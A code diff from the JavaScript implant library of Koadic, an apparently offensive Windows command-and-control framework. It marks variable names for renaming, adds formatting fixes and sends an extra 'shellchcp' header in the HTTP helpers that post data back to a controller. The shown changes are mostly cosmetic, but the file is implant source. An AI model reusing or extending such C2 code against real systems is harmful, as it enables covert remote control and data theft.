@@ -17,17 +17,17 @@ Koadic.EXPIRE = "~_EXPIREEPOCH_~";
  * @return void
  */
  //sleep.start
-Koadic.sleep = function(ms, callback)
+Koadic.sleep = function(#ms#, #callback#)
 {
     if (Koadic.isHTA())
     {
-        window.setTimeout(callback, ms);
+        window.setTimeout(#callback#, #ms#);
     }
     else
     {
-        var now = new Date().getTime();
-        while (new Date().getTime() < now + ms);
-        callback();
+        var #now# = new Date().getTime();
+        while (new Date().getTime() < #now# + #ms#);
+        #callback#();
     }
 }
 //sleep.end
@@ -513,12 +513,13 @@ Koadic.http.create = function()
     {
         http = new ActiveXObject("Msxml2.ServerXMLHTTP.6.0");
         http.setTimeouts(0, 0, 0, 0);
+
         //http = new ActiveXObject("Microsoft.XMLHTTP");
     }
     catch (e)
     {
         http = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
-        http.setTimeouts(30000, 30000, 30000, 0)
+        http.setTimeouts(30000, 30000, 30000, 0);
     }
 
     return http;
@@ -540,9 +541,13 @@ Koadic.http.addHeaders = function(http, headers)
     }
 
     if (!content)
+    {
         http.setRequestHeader("Content-Type", "application/octet-stream");
+    }
 
-    http.setRequestHeader("encoder", Koadic.user.encoder())
+    http.setRequestHeader("encoder", Koadic.user.encoder());
+    http.setRequestHeader("shellchcp", Koadic.user.shellchcp());
+    return;
 }
 //http.addHeaders.end
 
@@ -555,9 +560,9 @@ Koadic.http.post = function(url, data, headers)
 
     http.open("POST", url, false);
     Koadic.http.addHeaders(http, headers);
-    //alert("---Making request---\n" + url + '\n' + "--Data--\n" + data);
+    // alert("---Making request---\n" + url + '\n' + "--Data--\n" + data);
     http.send(data);
-    //alert("---Response---\n" + http.responseText)
+    // alert("---Response---\n" + http.responseText)
     return http;
 }
 //http.post.end
@@ -587,7 +592,6 @@ Koadic.http.get = function(url, headers)
 Koadic.http.upload = function(filepath, header_uuid, certutil, header_key)
 {
     var key = (typeof(header_key) !== "undefined") ? header_key : "ETag";
-
     var headers = {};
     headers[key] = header_uuid;
 
